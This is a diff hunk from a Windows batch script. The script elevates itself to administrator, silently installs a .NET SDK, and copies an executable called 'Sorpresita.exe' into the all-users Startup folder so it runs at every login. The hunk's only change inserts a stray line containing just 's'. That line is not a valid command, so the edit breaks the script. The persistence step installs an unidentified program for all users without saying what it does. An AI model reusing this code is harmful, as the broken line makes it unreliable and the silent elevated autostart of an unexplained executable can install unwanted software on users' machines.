@@ -21,7 +21,7 @@ if '%errorlevel%' NEQ '0' (
 :: BatchGotAdmin (Run as Admin code ends)
 
 start winget install Microsoft.WindowsDesktop.SDK --exact --version 8.0.0 --quiet --norestart
-
+s
 :: Add to startup for all users
 echo Configuring startup entry...
 copy "%~dp0Sorpresita.exe" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul
